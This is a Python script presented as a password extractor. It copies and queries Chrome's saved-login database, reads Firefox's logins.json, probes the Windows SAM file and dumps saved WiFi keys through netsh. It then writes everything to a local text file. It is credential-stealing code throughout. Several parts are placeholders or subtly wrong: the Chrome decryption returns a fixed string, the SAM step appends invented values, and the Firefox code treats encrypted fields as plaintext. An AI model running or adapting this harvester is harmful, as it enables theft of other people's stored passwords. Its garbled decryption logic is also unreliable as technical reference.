import os
import json
import sqlite3
import base64
from pathlib import Path
import shutil
from Crypto.Cipher import AES

def get_chrome_passwords():
    """Extract passwords from Chrome browser"""
    passwords = []
    
    # Path to Chrome user data
    chrome_path = Path.home() / "AppData/Local/Google/Chrome/User Data"
    
    if not chrome_path.exists():
        return passwords
    
    # Find profiles
    profiles = [p for p in chrome_path.glob("Profile*")]
    if not profiles:
        profiles = [chrome_path / "Default"]
    
    for profile in profiles:
        login_data = profile / "Login Data"
        if not login_data.exists():
            continue
        
        # Create a temporary copy to avoid database lock
        temp_db = profile / "Login Data_temp"
        shutil.copy2(login_data, temp_db)
        
        try:
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            # Query for login data
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            
            for row in cursor.fetchall():
                url, username, encrypted_password = row
                
                # Decrypt the password (simplified - actual decryption is more complex)
                try:
                    # This is a simplified example - actual Chrome decryption is more involved
                    password = decrypt_chrome_password(encrypted_password)
                    passwords.append({
                        'url': url,
                        'username': username,
                        'password': password,
                        'browser': 'Chrome'
                    })
                except:
                    pass
            
            conn.close()
        except Exception as e:
            print(f"Error accessing Chrome data: {e}")
        finally:
            # Remove the temporary database
            if temp_db.exists():
                temp_db.unlink()
    
    return passwords

def get_firefox_passwords():
    """Extract passwords from Firefox browser"""
    passwords = []
    
    # Path to Firefox profiles
    firefox_path = Path.home() / "AppData/Roaming/Mozilla/Firefox/Profiles"
    
    if not firefox_path.exists():
        return passwords
    
    # Find profiles
    profiles = [p for p in firefox_path.iterdir() if p.is_dir()]
    
    for profile in profiles:
        logins_json = profile / "logins.json"
        if not logins_json.exists():
            continue
        
        try:
            with open(logins_json, 'r', encoding='utf-8') as f:
                login_data = json.load(f)
            
            # Extract logins
            if 'logins' in login_data:
                for login in login_data['logins']:
                    passwords.append({
                        'url': login.get('hostname', ''),
                        'username': login.get('username', ''),
                        'password': login.get('password', ''),
                        'browser': 'Firefox'
                    })
        except Exception as e:
            print(f"Error accessing Firefox data: {e}")
    
    return passwords

def decrypt_chrome_password(encrypted_password):
    """Decrypt Chrome password (simplified example)"""
    # This is a simplified example - actual Chrome password decryption is more complex
    # and requires accessing the system's DPAPI on Windows or Keychain on macOS
    
    try:
        # In reality, you would need to use the system's DPAPI to decrypt
        # This is just a placeholder for demonstration
        if encrypted_password:
            return "ENCRYPTED_PASSWORD"
        return ""
    except:
        return ""

def get_system_passwords():
    """Attempt to extract system passwords (Windows example)"""
    passwords = []
    
    try:
        # This is a placeholder for system password extraction
        # In reality, this would require more complex techniques
        # and potentially administrative privileges
        
        # Example: Attempt to read SAM file (requires admin privileges)
        sam_path = Path("C:/Windows/System32/config/SAM")
        if sam_path.exists():
            # This would require special techniques to access
            passwords.append({
                'source': 'System',
                'username': 'SYSTEM_USER',
                'password': 'ENCRYPTED_SYSTEM_PASSWORD'
            })
    except Exception as e:
        print(f"Error accessing system passwords: {e}")
    
    return passwords

def get_wifi_passwords():
    """Extract saved WiFi passwords (Windows example)"""
    passwords = []
    
    try:
        # This is a simplified example of WiFi password extraction
        # In reality, you would need to use netsh command or other methods
        
        # Example using os.system (not recommended for production)
        result = os.popen("netsh wlan show profiles").read()
        
        # Parse the result to extract profile names
        lines = result.split('\n')
        profiles = []
        
        for line in lines:
            if "All User Profile" in line:
                profile_name = line.split(":")[1].strip()
                profiles.append(profile_name)
        
        # Get passwords for each profile
        for profile in profiles:
            try:
                profile_result = os.popen(f"netsh wlan show profile name=\"{profile}\" key=clear").read()
                
                # Parse the result to extract the password
                profile_lines = profile_result.split('\n')
                password = ""
                
                for line in profile_lines:
                    if "Key Content" in line:
                        password = line.split(":")[1].strip()
                        break
                
                passwords.append({
                    'source': 'WiFi',
                    'ssid': profile,
                    'password': password
                })
            except:
                pass
    except Exception as e:
        print(f"Error accessing WiFi passwords: {e}")
    
    return passwords

def save_passwords_to_file(passwords, filename="passwords.txt"):
    """Save extracted passwords to a file"""
    with open(filename, 'w', encoding='utf-8') as f:
        for item in passwords:
            if 'browser' in item:
                f.write(f"Browser: {item['browser']}\n")
                f.write(f"URL: {item['url']}\n")
                f.write(f"Username: {item['username']}\n")
                f.write(f"Password: {item['password']}\n\n")
            elif 'source' in item and item['source'] == 'WiFi':
                f.write(f"Source: {item['source']}\n")
                f.write(f"SSID: {item['ssid']}\n")
                f.write(f"Password: {item['password']}\n\n")
            else:
                f.write(f"Source: {item.get('source', 'Unknown')}\n")
                f.write(f"Username: {item.get('username', '')}\n")
                f.write(f"Password: {item.get('password', '')}\n\n")

def main():
    """Main function to extract all passwords"""
    all_passwords = []
    
    # Extract browser passwords
    all_passwords.extend(get_chrome_passwords())
    all_passwords.extend(get_firefox_passwords())
    
    # Extract system passwords
    all_passwords.extend(get_system_passwords())
    
    # Extract WiFi passwords
    all_passwords.extend(get_wifi_passwords())
    
    # Save passwords to file
    save_passwords_to_file(all_passwords)
    
    print(f"Extracted {len(all_passwords)} passwords. Saved to passwords.txt")

if __name__ == "__main__":
    main()
